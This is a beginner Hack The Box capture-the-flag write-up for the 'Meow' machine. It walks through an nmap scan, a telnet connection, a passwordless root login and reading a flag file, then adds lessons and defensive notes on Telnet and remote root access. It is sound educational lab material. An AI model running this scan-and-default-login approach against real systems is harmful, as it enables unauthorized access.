# Hack The Box - Meow

## Overview

**Meow** is a beginner Hack The Box Starting Point machine designed to introduce basic network enumeration and remote service authentication.

The machine demonstrates how an exposed Telnet service combined with insecure authentication can result in immediate system compromise.

The attack path is:

`Nmap -> Telnet -> root login -> flag`

Although the machine is simple, it introduces an important penetration testing principle: enumerate the available services before attempting exploitation.

---

## Initial Enumeration

I started by scanning the target with Nmap to identify exposed services.

```bash
nmap -sC -sV <TARGET_IP>
```

The important result was:

```text
23/tcp open telnet
```

Port 23 is traditionally used by **Telnet**, a protocol that provides remote command-line access to another system.

At this point there was no need to search for an exploit. The exposed service itself was the first thing to investigate.

---

## Telnet

I connected to the service using:

```bash
telnet <TARGET_IP>
```

The server presented a login prompt:

```text
Meow login:
```

Because this was an introductory machine, I tested common administrative usernames.

Using:

```text
root
```

allowed authentication without requiring a password.

This immediately provided a shell on the target.

---

## Confirming Access

After logging in, I confirmed which user the shell was running as:

```bash
whoami
```

The result was:

```text
root
```

I could also use:

```bash
id
```

which confirmed UID `0`.

```text
uid=0(root)
```

On Linux, UID `0` represents the root account.

This meant there was no separate privilege escalation stage. The initial Telnet login already provided full administrative access to the machine.

---

## Finding the Flag

With root access, I could enumerate the filesystem and locate the flag.

Basic commands such as:

```bash
ls
pwd
```

helped identify the current directory and its contents.

The flag could then be read using:

```bash
cat flag.txt
```

Meow was complete.

---

# Attack Path

```text
Nmap
  |
  v
23/tcp
  |
  v
Telnet
  |
  v
Login prompt
  |
  v
root
  |
  v
No password required
  |
  v
UID 0
  |
  v
Root shell
  |
  v
flag.txt
```

---

# Key Lessons

## Enumeration Comes First

There was no need for a complicated exploit.

Nmap identified Telnet on port 23, and investigating that service directly provided the path into the machine.

This reinforced a basic methodology:

```text
Discover
   |
   v
Enumerate
   |
   v
Understand
   |
   v
Exploit
```

Understanding what is exposed should come before searching for vulnerabilities.

---

## Ports Identify Network Services

A port provides a way for network services to receive connections.

In this case:

```text
23/tcp -> Telnet
```

Nmap helped identify both the open port and the service associated with it.

Other common examples include:

```text
21  -> FTP
22  -> SSH
23  -> Telnet
53  -> DNS
80  -> HTTP
443 -> HTTPS
445 -> SMB
```

Knowing common ports helps determine what should be investigated after an initial scan.

---

## Telnet Is Insecure

Telnet was historically used for remote administration, but it does not provide the encryption expected from modern remote administration protocols.

Authentication and session traffic can be exposed to interception.

SSH is generally used instead because it provides encrypted communication between the client and server.

```text
Telnet
Client -------------------- Server
       Unencrypted session

SSH
Client ==================== Server
         Encrypted session
```

---

## Root Access Should Be Heavily Restricted

The most serious problem on Meow was not simply that Telnet was running.

The service allowed:

```text
root
```

to authenticate without a password.

Root is the highest privileged account on a Linux system.

A remote service allowing unauthenticated root access effectively gives anyone who can reach that service complete control over the machine.

---

## Initial Access and Privilege Escalation Are Not Always Separate

On many machines, the attack path looks like:

```text
Initial access
     |
     v
Low privilege user
     |
     v
Privilege escalation
     |
     v
root
```

Meow was different:

```text
Initial access
     |
     v
root
```

Because Telnet provided direct root access, no privilege escalation vulnerability was required.

---

# Defensive Notes

Telnet should generally not be exposed for remote administration. SSH provides encrypted remote access and should be preferred.

Remote root login should also be disabled wherever possible.

Administrative access should require strong authentication, and services should follow the principle of least privilege.

A network scan against the system would have immediately revealed the exposed Telnet service:

```bash
nmap -sC -sV <TARGET_IP>
```

Regular service enumeration and configuration auditing could therefore have identified this issue before it was exploited.

---

# Skills Practiced

- Nmap scanning
- TCP port identification
- Service enumeration
- Telnet
- Remote authentication
- Basic Linux commands
- Linux users and UID concepts
- Root privileges
- Basic penetration testing methodology

---

## Disclaimer

This writeup documents techniques used in an authorized Hack The Box lab environment for educational purposes.
